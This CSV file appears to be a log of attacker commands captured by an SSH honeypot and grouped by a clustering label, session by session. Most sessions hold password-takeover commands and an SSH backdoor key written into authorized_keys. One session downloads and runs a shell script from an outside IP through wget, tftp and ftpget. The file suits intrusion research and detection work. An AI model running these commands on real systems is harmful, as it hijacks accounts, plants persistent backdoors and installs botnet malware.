session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
b71b598a1a42,1,4327,12.906570434570312,15,"echo ""root:sRDwO76UK5N2""|chpasswd|bash"
b71b598a1a42,1,4328,12.906570434570312,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
b71b598a1a42,1,4329,12.906570434570312,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
b71b598a1a42,1,4330,12.906570434570312,15,ls -lh $(which ls)
b71b598a1a42,1,4331,12.906570434570312,15,which ls
b71b598a1a42,1,4332,12.906570434570312,15,crontab -l
b71b598a1a42,1,4333,12.906570434570312,15,w
b71b598a1a42,1,4334,12.906570434570312,15,uname -m
b71b598a1a42,1,4335,12.906570434570312,15,cat /proc/cpuinfo | grep model | grep name | wc -l
b71b598a1a42,1,4336,12.906570434570312,15,top
b71b598a1a42,1,4337,12.906570434570312,15,uname
b71b598a1a42,1,4338,12.906570434570312,15,uname -a
b71b598a1a42,1,4339,12.906570434570312,15,lscpu | grep Model
b71b598a1a42,1,4340,12.906570434570312,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
3ccb8e170a51,1,4341,31.79839253425598,18,cat /proc/cpuinfo | grep name | wc -l
3ccb8e170a51,1,4342,31.79839253425598,18,"echo -e ""1qaz\nzFl3iEkNvEgc\nzFl3iEkNvEgc""|passwd|bash"
3ccb8e170a51,1,4343,31.79839253425598,18,Enter new UNIX password: 
3ccb8e170a51,1,4344,31.79839253425598,18,Enter new UNIX password:
3ccb8e170a51,1,4345,31.79839253425598,18,"echo ""1qaz\nzFl3iEkNvEgc\nzFl3iEkNvEgc\n""|passwd"
3ccb8e170a51,1,4346,31.79839253425598,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
3ccb8e170a51,1,4347,31.79839253425598,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
3ccb8e170a51,1,4348,31.79839253425598,18,ls -lh $(which ls)
3ccb8e170a51,1,4349,31.79839253425598,18,which ls
3ccb8e170a51,1,4350,31.79839253425598,18,crontab -l
3ccb8e170a51,1,4351,31.79839253425598,18,w
3ccb8e170a51,1,4352,31.79839253425598,18,uname -m
3ccb8e170a51,1,4353,31.79839253425598,18,cat /proc/cpuinfo | grep model | grep name | wc -l
3ccb8e170a51,1,4354,31.79839253425598,18,top
3ccb8e170a51,1,4355,31.79839253425598,18,uname
3ccb8e170a51,1,4356,31.79839253425598,18,uname -a
3ccb8e170a51,1,4357,31.79839253425598,18,lscpu | grep Model
3ccb8e170a51,1,4358,31.79839253425598,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
0458ee8040d8,1,4359,15.109265089035034,15,cat /proc/cpuinfo | grep name | wc -l
0458ee8040d8,1,4360,15.109265089035034,15,"echo ""root:iAq6BLGIUWxQ""|chpasswd|bash"
0458ee8040d8,1,4361,15.109265089035034,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
0458ee8040d8,1,4362,15.109265089035034,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
0458ee8040d8,1,4363,15.109265089035034,15,ls -lh $(which ls)
0458ee8040d8,1,4364,15.109265089035034,15,which ls
0458ee8040d8,1,4365,15.109265089035034,15,crontab -l
0458ee8040d8,1,4366,15.109265089035034,15,w
0458ee8040d8,1,4367,15.109265089035034,15,uname -m
0458ee8040d8,1,4368,15.109265089035034,15,cat /proc/cpuinfo | grep model | grep name | wc -l
0458ee8040d8,1,4369,15.109265089035034,15,top
0458ee8040d8,1,4370,15.109265089035034,15,uname
0458ee8040d8,1,4371,15.109265089035034,15,uname -a
0458ee8040d8,1,4372,15.109265089035034,15,lscpu | grep Model
0458ee8040d8,1,4373,15.109265089035034,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
bbbf1c2490ed,1,4374,15.04735231399536,15,cat /proc/cpuinfo | grep name | wc -l
bbbf1c2490ed,1,4375,15.04735231399536,15,"echo ""root:MXraCuclrp08""|chpasswd|bash"
bbbf1c2490ed,1,4376,15.04735231399536,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
bbbf1c2490ed,1,4377,15.04735231399536,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
bbbf1c2490ed,1,4378,15.04735231399536,15,ls -lh $(which ls)
bbbf1c2490ed,1,4379,15.04735231399536,15,which ls
bbbf1c2490ed,1,4380,15.04735231399536,15,crontab -l
bbbf1c2490ed,1,4382,15.04735231399536,15,w
bbbf1c2490ed,1,4386,15.04735231399536,15,uname -m
bbbf1c2490ed,1,4388,15.04735231399536,15,cat /proc/cpuinfo | grep model | grep name | wc -l
bbbf1c2490ed,1,4390,15.04735231399536,15,top
bbbf1c2490ed,1,4392,15.04735231399536,15,uname
bbbf1c2490ed,1,4395,15.04735231399536,15,uname -a
bbbf1c2490ed,1,4397,15.04735231399536,15,lscpu | grep Model
bbbf1c2490ed,1,4399,15.04735231399536,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
ecb527987c86,1,4381,16.670591592788696,18,cat /proc/cpuinfo | grep name | wc -l
ecb527987c86,1,4383,16.670591592788696,18,"echo -e ""abc123\nhQ5es7J8KnCn\nhQ5es7J8KnCn""|passwd|bash"
ecb527987c86,1,4384,16.670591592788696,18,Enter new UNIX password: 
ecb527987c86,1,4385,16.670591592788696,18,Enter new UNIX password:
ecb527987c86,1,4387,16.670591592788696,18,"echo ""abc123\nhQ5es7J8KnCn\nhQ5es7J8KnCn\n""|passwd"
ecb527987c86,1,4389,16.670591592788696,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
ecb527987c86,1,4391,16.670591592788696,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
ecb527987c86,1,4393,16.670591592788696,18,ls -lh $(which ls)
ecb527987c86,1,4394,16.670591592788696,18,which ls
ecb527987c86,1,4396,16.670591592788696,18,crontab -l
ecb527987c86,1,4398,16.670591592788696,18,w
ecb527987c86,1,4400,16.670591592788696,18,uname -m
ecb527987c86,1,4401,16.670591592788696,18,cat /proc/cpuinfo | grep model | grep name | wc -l
ecb527987c86,1,4402,16.670591592788696,18,top
ecb527987c86,1,4403,16.670591592788696,18,uname
ecb527987c86,1,4404,16.670591592788696,18,uname -a
ecb527987c86,1,4405,16.670591592788696,18,lscpu | grep Model
ecb527987c86,1,4406,16.670591592788696,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
90612da959dc,3,4407,182.4965500831604,1,cat /proc/cpuinfo | grep name | wc -l
f01f850367a7,1,4408,12.723068952560425,18,cat /proc/cpuinfo | grep name | wc -l
f01f850367a7,1,4409,12.723068952560425,18,"echo -e ""abc1234\nCDpqtvtibCpJ\nCDpqtvtibCpJ""|passwd|bash"
f01f850367a7,1,4410,12.723068952560425,18,Enter new UNIX password: 
f01f850367a7,1,4411,12.723068952560425,18,Enter new UNIX password:
f01f850367a7,1,4412,12.723068952560425,18,"echo ""abc1234\nCDpqtvtibCpJ\nCDpqtvtibCpJ\n""|passwd"
f01f850367a7,1,4413,12.723068952560425,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
f01f850367a7,1,4414,12.723068952560425,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
f01f850367a7,1,4415,12.723068952560425,18,ls -lh $(which ls)
f01f850367a7,1,4416,12.723068952560425,18,which ls
f01f850367a7,1,4417,12.723068952560425,18,crontab -l
f01f850367a7,1,4418,12.723068952560425,18,w
f01f850367a7,1,4419,12.723068952560425,18,uname -m
f01f850367a7,1,4420,12.723068952560425,18,cat /proc/cpuinfo | grep model | grep name | wc -l
f01f850367a7,1,4421,12.723068952560425,18,top
f01f850367a7,1,4422,12.723068952560425,18,uname
f01f850367a7,1,4423,12.723068952560425,18,uname -a
f01f850367a7,1,4424,12.723068952560425,18,lscpu | grep Model
f01f850367a7,1,4425,12.723068952560425,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
ff806abca3c5,1,4426,14.701987028121948,15,cat /proc/cpuinfo | grep name | wc -l
ff806abca3c5,1,4427,14.701987028121948,15,"echo ""root:pHdvymSpUwz0""|chpasswd|bash"
ff806abca3c5,1,4428,14.701987028121948,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
ff806abca3c5,1,4429,14.701987028121948,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
ff806abca3c5,1,4430,14.701987028121948,15,ls -lh $(which ls)
ff806abca3c5,1,4431,14.701987028121948,15,which ls
ff806abca3c5,1,4432,14.701987028121948,15,crontab -l
ff806abca3c5,1,4434,14.701987028121948,15,w
ff806abca3c5,1,4438,14.701987028121948,15,uname -m
ff806abca3c5,1,4439,14.701987028121948,15,cat /proc/cpuinfo | grep model | grep name | wc -l
ff806abca3c5,1,4441,14.701987028121948,15,top
ff806abca3c5,1,4443,14.701987028121948,15,uname
ff806abca3c5,1,4444,14.701987028121948,15,uname -a
ff806abca3c5,1,4446,14.701987028121948,15,lscpu | grep Model
ff806abca3c5,1,4449,14.701987028121948,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
da449ade5d2c,1,4433,22.37007999420166,18,cat /proc/cpuinfo | grep name | wc -l
da449ade5d2c,1,4435,22.37007999420166,18,"echo -e ""andrea\nazkC5S0Rn2Z6\nazkC5S0Rn2Z6""|passwd|bash"
da449ade5d2c,1,4436,22.37007999420166,18,Enter new UNIX password: 
da449ade5d2c,1,4437,22.37007999420166,18,Enter new UNIX password:
da449ade5d2c,1,4440,22.37007999420166,18,"echo ""andrea\nazkC5S0Rn2Z6\nazkC5S0Rn2Z6\n""|passwd"
da449ade5d2c,1,4442,22.37007999420166,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
da449ade5d2c,1,4445,22.37007999420166,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
da449ade5d2c,1,4447,22.37007999420166,18,ls -lh $(which ls)
da449ade5d2c,1,4448,22.37007999420166,18,which ls
da449ade5d2c,1,4450,22.37007999420166,18,crontab -l
da449ade5d2c,1,4451,22.37007999420166,18,w
da449ade5d2c,1,4452,22.37007999420166,18,uname -m
da449ade5d2c,1,4453,22.37007999420166,18,cat /proc/cpuinfo | grep model | grep name | wc -l
da449ade5d2c,1,4454,22.37007999420166,18,top
da449ade5d2c,1,4455,22.37007999420166,18,uname
da449ade5d2c,1,4456,22.37007999420166,18,uname -a
da449ade5d2c,1,4457,22.37007999420166,18,lscpu | grep Model
da449ade5d2c,1,4458,22.37007999420166,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
700693310282,1,4459,48.706536293029785,30,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
700693310282,1,4460,48.706536293029785,30,cat /proc/cpuinfo | grep name | wc -l
700693310282,1,4461,48.706536293029785,30,"echo -e ""operator\nEUBSGPdja1CE\nEUBSGPdja1CE""|passwd|bash"
700693310282,1,4462,48.706536293029785,30,Enter new UNIX password: 
700693310282,1,4463,48.706536293029785,30,Enter new UNIX password:
700693310282,1,4464,48.706536293029785,30,"echo ""operator\nEUBSGPdja1CE\nEUBSGPdja1CE\n""|passwd"
700693310282,1,4465,48.706536293029785,30,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
700693310282,1,4466,48.706536293029785,30,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
700693310282,1,4467,48.706536293029785,30,ls -lh $(which ls)
700693310282,1,4468,48.706536293029785,30,which ls
700693310282,1,4469,48.706536293029785,30,crontab -l
700693310282,1,4470,48.706536293029785,30,w
700693310282,1,4471,48.706536293029785,30,uname -m
700693310282,1,4472,48.706536293029785,30,cat /proc/cpuinfo | grep model | grep name | wc -l
700693310282,1,4473,48.706536293029785,30,top
700693310282,1,4474,48.706536293029785,30,uname
700693310282,1,4475,48.706536293029785,30,uname -a
700693310282,1,4476,48.706536293029785,30,lscpu | grep Model
700693310282,1,4477,48.706536293029785,30,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
700693310282,1,4478,48.706536293029785,30,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
700693310282,1,4479,48.706536293029785,30,ls -lh $(which ls)
700693310282,1,4480,48.706536293029785,30,which ls
700693310282,1,4481,48.706536293029785,30,crontab -l
700693310282,1,4482,48.706536293029785,30,w
700693310282,1,4483,48.706536293029785,30,uname -m
700693310282,1,4484,48.706536293029785,30,cat /proc/cpuinfo | grep model | grep name | wc -l
700693310282,1,4485,48.706536293029785,30,top
700693310282,1,4486,48.706536293029785,30,uname
700693310282,1,4487,48.706536293029785,30,uname -a
700693310282,1,4488,48.706536293029785,30,lscpu | grep Model
da2fa3f1ccb8,2,4489,17.30307912826538,5,sh
da2fa3f1ccb8,2,4490,17.30307912826538,5,shell
da2fa3f1ccb8,2,4491,17.30307912826538,5,shell
da2fa3f1ccb8,2,4492,17.30307912826538,5,ls /
da2fa3f1ccb8,2,4493,17.30307912826538,5,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.210.20.109/bins.sh; busybox wget http://31.210.20.109/bins.sh; tftp -r bins.sh -g 31.210.20.109; busybox tftp -r bins.sh -g bins.sh; ftpget -v -u anonymous -p anonymous -P 21 31.210.20.109 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 31.210.20.109 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh
59b843030ac2,1,4494,6.781432390213013,15,cat /proc/cpuinfo | grep name | wc -l
59b843030ac2,1,4495,6.781432390213013,15,"echo ""root:LSWvW7SNgTk0""|chpasswd|bash"
59b843030ac2,1,4496,6.781432390213013,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
59b843030ac2,1,4497,6.781432390213013,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
59b843030ac2,1,4498,6.781432390213013,15,ls -lh $(which ls)
59b843030ac2,1,4499,6.781432390213013,15,which ls
59b843030ac2,1,4500,6.781432390213013,15,crontab -l
59b843030ac2,1,4501,6.781432390213013,15,w
59b843030ac2,1,4502,6.781432390213013,15,uname -m
59b843030ac2,1,4503,6.781432390213013,15,cat /proc/cpuinfo | grep model | grep name | wc -l
59b843030ac2,1,4504,6.781432390213013,15,top
59b843030ac2,1,4505,6.781432390213013,15,uname
59b843030ac2,1,4506,6.781432390213013,15,uname -a
59b843030ac2,1,4507,6.781432390213013,15,lscpu | grep Model
59b843030ac2,1,4508,6.781432390213013,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
9409bfd9e2cf,1,4509,13.51843786239624,15,cat /proc/cpuinfo | grep name | wc -l
9409bfd9e2cf,1,4510,13.51843786239624,15,"echo ""root:vyda3Ymu5Ly1""|chpasswd|bash"
9409bfd9e2cf,1,4511,13.51843786239624,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
9409bfd9e2cf,1,4512,13.51843786239624,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
9409bfd9e2cf,1,4513,13.51843786239624,15,ls -lh $(which ls)
9409bfd9e2cf,1,4514,13.51843786239624,15,which ls
9409bfd9e2cf,1,4515,13.51843786239624,15,crontab -l
9409bfd9e2cf,1,4516,13.51843786239624,15,w
9409bfd9e2cf,1,4517,13.51843786239624,15,uname -m
9409bfd9e2cf,1,4518,13.51843786239624,15,cat /proc/cpuinfo | grep model | grep name | wc -l
9409bfd9e2cf,1,4519,13.51843786239624,15,top
9409bfd9e2cf,1,4520,13.51843786239624,15,uname
9409bfd9e2cf,1,4521,13.51843786239624,15,uname -a
9409bfd9e2cf,1,4522,13.51843786239624,15,lscpu | grep Model
9409bfd9e2cf,1,4523,13.51843786239624,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
6ff060371f1a,1,4524,16.299005031585693,18,cat /proc/cpuinfo | grep name | wc -l
6ff060371f1a,1,4525,16.299005031585693,18,"echo -e ""tomcat7\nUwm0eLJJtIj3\nUwm0eLJJtIj3""|passwd|bash"
6ff060371f1a,1,4526,16.299005031585693,18,Enter new UNIX password: 
6ff060371f1a,1,4527,16.299005031585693,18,Enter new UNIX password:
6ff060371f1a,1,4528,16.299005031585693,18,"echo ""tomcat7\nUwm0eLJJtIj3\nUwm0eLJJtIj3\n""|passwd"
6ff060371f1a,1,4529,16.299005031585693,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
6ff060371f1a,1,4530,16.299005031585693,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
6ff060371f1a,1,4531,16.299005031585693,18,ls -lh $(which ls)
6ff060371f1a,1,4532,16.299005031585693,18,which ls
6ff060371f1a,1,4533,16.299005031585693,18,crontab -l
6ff060371f1a,1,4534,16.299005031585693,18,w
6ff060371f1a,1,4535,16.299005031585693,18,uname -m
6ff060371f1a,1,4536,16.299005031585693,18,cat /proc/cpuinfo | grep model | grep name | wc -l
6ff060371f1a,1,4537,16.299005031585693,18,top
6ff060371f1a,1,4538,16.299005031585693,18,uname
6ff060371f1a,1,4539,16.299005031585693,18,uname -a
6ff060371f1a,1,4540,16.299005031585693,18,lscpu | grep Model
6ff060371f1a,1,4541,16.299005031585693,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
9d7be25a54eb,1,4542,14.5110821723938,15,cat /proc/cpuinfo | grep name | wc -l
9d7be25a54eb,1,4543,14.5110821723938,15,"echo ""root:jaDSxl9vS4v9""|chpasswd|bash"
